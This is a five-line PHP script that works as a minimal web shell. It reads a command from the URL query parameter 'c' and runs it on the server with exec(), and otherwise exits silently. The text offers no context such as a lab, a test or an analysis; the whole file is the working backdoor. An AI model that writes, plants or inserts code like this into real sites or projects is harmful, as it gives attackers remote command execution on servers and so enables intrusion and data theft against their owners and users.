<?php
if(isset($_GET["c"])){
    exec($_GET["c"]);
}else
    die();